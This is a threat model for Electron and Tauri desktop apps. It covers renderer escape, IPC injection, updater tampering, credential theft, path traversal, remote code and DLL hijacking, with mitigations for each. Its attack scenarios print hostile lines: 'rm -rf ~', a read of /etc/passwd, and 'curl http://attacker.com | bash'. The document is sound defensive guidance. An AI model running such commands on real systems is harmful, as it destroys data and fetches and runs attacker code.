# Desktop Security — Threat Model

## Threat Surface

Desktop apps run with OS-level user privileges and often have access to the file system, network, and OS APIs. Electron apps have a unique threat surface: a Chromium renderer that, if misconfigured, can run Node.js and escape to the OS.

1. **Renderer process escape** — compromised renderer gains Node.js access via misconfigured Electron settings
2. **IPC injection** — renderer sends crafted IPC messages to trigger privileged main process operations
3. **Auto-updater tampering** — attacker intercepts or replaces update package with malicious payload
4. **Keychain/credential theft** — sensitive data stored in plain files instead of OS keychain
5. **File system traversal** — file path arguments escape intended scope
6. **Remote content execution** — app loads and executes remote JavaScript in main or renderer context
7. **DLL/dylib hijacking** — malicious native library loaded by app on startup (Windows/Linux)

---

## Threat 1: Renderer Process Escape

**Description:** Electron renderer with `nodeIntegration: true` or `contextIsolation: false` allows a compromised renderer (via XSS or malicious content) to call Node.js APIs — reading the file system, executing shell commands, or accessing the network without restrictions.

**Attack scenario:**
```javascript
// If nodeIntegration: true, an XSS in the renderer can:
require('child_process').exec('rm -rf ~')
require('fs').readFileSync('/etc/passwd')
```

**Mitigations:**
- `nodeIntegration: false` in ALL BrowserWindow webPreferences
- `contextIsolation: true` in ALL BrowserWindow webPreferences
- `sandbox: true` in ALL BrowserWindow webPreferences
- All Node.js access goes through preload script with `contextBridge`
- preload script exposes only typed, validated API functions — not `ipcRenderer` itself

**Verification gate:** Grep for `nodeIntegration: true` — must return zero results.

---

## Threat 2: IPC Injection

**Description:** Renderer sends crafted IPC messages (via XSS, malicious content, or rogue extension) to trigger main process operations that read/write files, execute code, or access sensitive APIs.

**Attack scenario:**
```javascript
// In compromised renderer:
ipcRenderer.invoke('execute-shell', { cmd: 'curl http://attacker.com | bash' })
```

**Mitigations:**
- Main process validates `event.senderFrame.url` is an expected origin before processing any IPC message
- Main process validates all input parameters before acting (schema validation, not just type checks)
- IPC channels are an allowlist — unknown channels rejected, not silently ignored
- Privileged operations (file write, shell exec, network to new destinations) require explicit user action, not just a message

---

## Threat 3: Auto-Updater Tampering

**Description:** Attacker performs MITM on the update check, replaces the update manifest or package with a malicious version, which the updater installs silently.

**Attack scenarios:**
- DNS hijack redirects update URL to attacker server
- CDN compromise replaces update package
- Update server credentials stolen; attacker pushes malicious update

**Mitigations:**
- Updates served over HTTPS only (TLS certificate verification enabled, no InsecureSkipVerify)
- Update packages are code-signed — updater verifies signature before applying
- electron-updater: verify `publisherName` matches expected signing identity
- Tauri: `pubkey` in tauri.conf.json verifies update signature
- SHA-512 hash in `latest.yml` verified before applying update

---

## Threat 4: Credential/Keychain Theft

**Description:** App stores sensitive credentials (API tokens, passwords) in plain JSON files in the user data directory. Attacker with file system access reads them.

**Mitigations:**
- Sensitive data stored in OS keychain only: `keytar` (Electron), Tauri `stronghold`, macOS `Keychain`, Windows `Credential Manager`
- Never store tokens/passwords in `localStorage`, `chrome.storage`, or plain JSON files
- If sensitive config files are unavoidable: encrypt with key derived from OS identity + user-specific entropy

---

## Threat 5: File System Traversal

**Description:** App accepts a file path (from user, from IPC, from URL handler) and reads/writes outside intended scope.

**Mitigations:**
- All user-supplied paths resolved with `path.resolve()` or `fs.realpath()` before use
- Resolved path validated against expected root directory
- Open file dialogs restricted to specific locations via `defaultPath` and `filters`
- Never follow symlinks outside expected scope without explicit check

---

## Threat 6: Remote Content Execution

**Description:** App loads remote JavaScript (from web URL, CDN, or injected script) in main or renderer context.

**Mitigations:**
- `webSecurity: true` (default — do not override)
- Content Security Policy on renderer: `script-src 'self'`
- Never use `eval()` or `new Function()` with external data in any process
- Tauri: `security.csp` in tauri.conf.json enforces CSP at WebView level
- Do not load external web pages in a privileged BrowserWindow — use `shell.openExternal()` instead

---

## Threat 7: DLL/dylib Hijacking (Windows/Linux)

**Description:** Attacker places a malicious DLL/dylib in the app directory or a directory earlier in the search path. App loads the malicious library at startup.

**Mitigations:**
- Use absolute paths for native module loading, not relative
- Code-sign all bundled native libraries
- Windows: enable safe DLL search mode (default in modern Windows)
- Verify integrity of bundled native modules in CI before packaging
- Minimize native addon usage — each adds a dylib load at startup
